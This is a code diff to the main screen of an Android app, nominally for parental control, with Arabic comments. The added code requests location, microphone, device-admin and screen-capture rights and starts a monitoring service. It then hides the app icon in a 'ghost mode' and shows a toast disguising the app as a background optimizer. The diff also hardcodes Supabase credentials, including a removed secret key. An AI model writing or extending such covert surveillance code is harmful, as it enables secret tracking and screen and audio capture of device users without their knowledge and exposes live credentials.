@@ -8,6 +8,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
+import android.media.projection.MediaProjectionManager
 import android.provider.Settings
 import android.util.Log
 import android.widget.Toast
@@ -16,6 +17,7 @@ import androidx.appcompat.app.AppCompatActivity
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import androidx.activity.result.contract.ActivityResultContracts
 
 /**
  * Activity الأساسية لإعداد وتفعيل ميزات الرقابة الأبوية
@@ -23,18 +25,81 @@ import kotlinx.coroutines.launch
 class MainActivity : AppCompatActivity() {
 
     private lateinit var parentalControlManager: ParentalControlManager
+    private val requiredPermissions = arrayOf(
+        android.Manifest.permission.ACCESS_FINE_LOCATION,
+        android.Manifest.permission.ACCESS_COARSE_LOCATION,
+        android.Manifest.permission.RECORD_AUDIO
+    )
+    private val adminLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (parentalControlManager.isAdminActive()) {
+            Log.i("MainActivity", "Admin activated! Now requesting screen capture...")
+            requestScreenCapture()
+        } else {
+            Log.w("MainActivity", "Admin activation failed or cancelled")
+        }
+    }
+
+    private val screenCaptureLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            Log.i("MainActivity", "Screen capture permission granted!")
+            // بدء الخدمة مع بيانات الإذن
+            MonitoringForegroundService.start(this, result.resultCode, result.data)
+            triggerStealthMode()
+        } else {
+            Log.w("MainActivity", "Screen capture permission denied")
+            // إذا رفض، نبدأ الخدمة بدون لقطات شاشة أو نكرر الطلب
+            MonitoringForegroundService.start(this)
+            triggerStealthMode()
+        }
+    }
+
+    private val permissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissions ->
+        val allGranted = permissions.entries.all { it.value }
+        if (allGranted) {
+            Log.i("MainActivity", "All permissions granted by user")
+            setupAppFlow()
+        } else {
+            Log.w("MainActivity", "Some permissions were denied")
+            // نواصل العمل بما هو متاح
+            setupAppFlow()
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
         try {
-            // 1. تهيئة مدير الرقابة الأبوية أولاً
             parentalControlManager = ParentalControlManager(this)
 
-            // 2. تهيئة Supabase بصيغة آمنة
+            // 1. فحص وطلب الصلاحيات المفقودة
+            checkAndRequestPermissions()
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error in onCreate: ${e.message}")
+        }
+    }
+
+    private fun checkAndRequestPermissions() {
+        val missing = requiredPermissions.filter {
+            checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
+        }
+        if (missing.isNotEmpty()) {
+            permissionLauncher.launch(missing.toTypedArray())
+        } else {
+            setupAppFlow()
+        }
+    }
+
+    private fun setupAppFlow() {
+        try {
             val initialized = SupabaseManager.getInstance().initialize(
                 "https://kubowqqqawkgghxcktoe.supabase.co",
-                "sb_secret_wNza7KnqwnZeidrwqpVsQQ_g0a05_YG"
+                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM"
             )
 
             if (!initialized) {
@@ -61,21 +126,15 @@ class MainActivity : AppCompatActivity() {
                 launchSamsungBatterySettings()
             }
 
-            // 8. تفعيل التخفي بتأخير بسيط
+            // 8. طلب إذن التخفي والالتقاط (بعد تأكيد المسؤول)
             if (parentalControlManager.isAdminActive()) {
-                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    try {
-                        StealthManager.hideAppIcon(this)
-                        // finish() // يمكن إغلاقه لزيادة التخفي بعد الإعداد الأول
-                    } catch (e: Exception) {
-                        Log.e("MainActivity", "Stealth error: ${e.message}")
-                    }
-                }, 2000)
+                // نطلب تصوير الشاشة أولاً، وعندما ينتهي (بنجاح أو فشل) سنقوم بالتخفي
+                requestScreenCapture()
+            } else {
+                showEnableAdminDialog()
             }
         } catch (e: Exception) {
-            Log.e("MainActivity", "Critical error in onCreate", e)
-            val errorMsg = "${e.javaClass.simpleName}: ${e.message}"
-            Toast.makeText(this, "خطأ في بدء التشغيل: $errorMsg", Toast.LENGTH_LONG).show()
+            Log.e("MainActivity", "Error in setupAppFlow: ${e.message}")
         }
     }
 
@@ -130,8 +189,8 @@ class MainActivity : AppCompatActivity() {
     private fun checkAdminStatus() {
         if (parentalControlManager.isAdminActive()) {
             Toast.makeText(this, "✓ محرك التحسين قيد التشغيل في الخلفية", Toast.LENGTH_SHORT).show()
-            val intent = Intent(this, HiddenSettingsActivity::class.java)
-            startActivity(intent)
+            // بدلاً من الانتقال لصفحة الإعدادات، نبدأ عملية الالتقاط ثم التخفي
+            requestScreenCapture()
         } else {
             showEnableAdminDialog()
         }
@@ -139,14 +198,39 @@ class MainActivity : AppCompatActivity() {
 
     private fun showEnableAdminDialog() {
         AlertDialog.Builder(this)
-            .setTitle("تفعيل الرقابة الأبوية")
-            .setMessage("لاستخدام ميزات الرقابة الأبوية، يجب تفعيل صلاحيات المسؤول")
-            .setPositiveButton("تفعيل") { _, _ ->
-                parentalControlManager.requestEnableAdmin(this)
+            .setTitle("تفعيل وضع الشبح والتحصين")
+            .setMessage("لاستخدام ميزات الحماية المتقدمة وإخفاء التطبيق، يجب تفعيل صلاحيات المسؤول")
+            .setPositiveButton("تفعيل الآن") { _, _ ->
+                val intent = parentalControlManager.getAdminRequestIntent()
+                adminLauncher.launch(intent)
             }
             .setNegativeButton("إلغاء", null)
             .setCancelable(false)
             .show()
+    }
+
+    private fun requestScreenCapture() {
+        try {
+            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error requesting screen capture: ${e.message}")
+            triggerStealthMode()
+        }
+    }
+
+    private fun triggerStealthMode() {
+        Log.i("MainActivity", "Triggering Stealth Mode...")
+        Toast.makeText(this, "✓ تم تفعيل وضع الشبح. سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()
+        
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            try {
+                StealthManager.hideAppIcon(this)
+                finish() 
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Stealth error: ${e.message}")
+            }
+        }, 3000)
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
